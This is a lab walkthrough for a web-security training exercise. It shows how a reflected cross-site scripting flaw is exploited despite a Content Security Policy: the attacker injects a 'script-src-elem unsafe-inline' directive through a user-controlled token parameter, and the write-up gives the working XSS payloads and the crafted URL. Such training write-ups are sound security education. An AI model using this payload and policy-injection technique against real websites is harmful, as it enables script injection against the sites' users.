# Reflected XSS protected by CSP, with CSP bypass

## Description

The website in [this lab](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass) uses CSP and contains a reflected XSS vulnerability. 

## Reproduction and proof of concept

1. Enter the following into the search box:

```text
<img src=1 onerror=alert(1)>
```

2. Note the payload is reflected, but the CSP prevents the script from executing.
3. In Burp Proxy, observe that the response contains a `Content-Security-Policy` header, and the `report-uri` directive contains a parameter called token. Because you can control the token parameter, you can inject your own CSP directives into the policy.

```text
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```

4. Visit the following URL, replacing `0a87000e04aa4aacc0a72cd800b1007d` with your lab ID:

```text
https://0a87000e04aa4aacc0a72cd800b1007d.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

The injection uses the `script-src-elem` directive in CSP. This directive allows for targeting just script elements. Using this directive, it is possible to overwrite existing `script-src` rules enabling `unsafe-inline` injections, which allows for using inline scripts.
